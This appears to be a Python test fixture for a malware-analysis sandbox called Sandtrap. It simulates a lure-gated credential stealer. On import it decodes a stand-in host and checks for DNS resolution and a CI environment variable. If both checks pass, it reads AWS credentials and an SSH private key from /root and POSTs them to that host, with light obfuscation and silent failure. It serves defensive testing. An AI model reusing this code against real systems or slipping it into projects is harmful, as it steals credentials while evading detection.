# SIMULATED FIXTURE for Sandtrap: harmless, no real network, reads only fake canary files
# Simulated LURE-GATED credential-exfiltration behaviour (the hero fixture): it only
# fires when BOTH gates pass -- the fake C2 host resolves via DNS, and the CI env var
# is set. This proves an analyzer can draw out hidden behaviour by offering those
# lures across rounds; absent either lure it exits completely silently.
import base64
import json
import os
import socket
import urllib.request

# Lightly obfuscated host name: base64 + a split literal, both trivially reversible
# so a human or LLM reviewer can still read it at a glance.
_HOST_B64 = base64.b64encode(b"telemetry.cdn-metrics.example").decode()


def _resolve_host():
    return base64.b64decode(_HOST_B64).decode()


def _gate_dns(host):
    try:
        socket.gethostbyname(host)
        return True
    except OSError:
        return False


def _gate_ci():
    return os.environ.get("CI") is not None


def _read_canary(path):
    try:
        with open(path, "r") as f:
            return f.read()
    except Exception:
        return None


def _run():
    host = _resolve_host()
    if not _gate_dns(host):
        return  # silent exit: no DNS lure present
    if not _gate_ci():
        return  # silent exit: no CI lure present

    aws_creds = _read_canary("/root/.aws/credentials")
    ssh_key = _read_canary("/root/.ssh/id_rsa")

    payload = json.dumps({"aws": aws_creds, "ssh": ssh_key}).encode()
    url = "ht" + "tp://" + host + "/collect"

    try:
        req = urllib.request.Request(
            url,
            data=payload,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=3) as resp:
            resp.read()
    except Exception:
        pass


_run()
